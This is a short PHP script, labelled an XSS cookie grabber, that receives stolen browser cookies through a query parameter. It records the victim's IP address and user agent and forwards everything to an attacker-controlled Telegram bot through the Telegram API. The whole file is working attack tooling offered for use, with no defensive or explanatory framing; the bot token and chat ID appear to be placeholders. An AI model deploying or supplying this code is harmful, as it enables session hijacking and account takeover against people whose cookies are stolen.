<?php
/*
	(XSS) cookie grabber for telegram bot
	2k18
*/
	if(!isset($_GET['q']))
		return;
	
	//vars
	$g_Cookies = $_GET['q'];
	$g_IP = $_SERVER['REMOTE_ADDR'];
	$g_UserAgent = $_SERVER['HTTP_USER_AGENT'];
	
	//telegram settings
	$g_API = '123456789:AAFwz5s3JSPfaaqSSQ5swVJjpBgjY12eSpMh1'; //bot token
	$g_ChatID = '123123123'; //your profile or group
	$g_Message = "IP: $g_IP | UserAgent: $g_UserAgent | Cookies: $g_Cookies";
	
	//sending a message
	file_get_contents("https://api.telegram.org/bot$g_API/sendMessage?chat_id=$g_ChatID&text=$g_Message");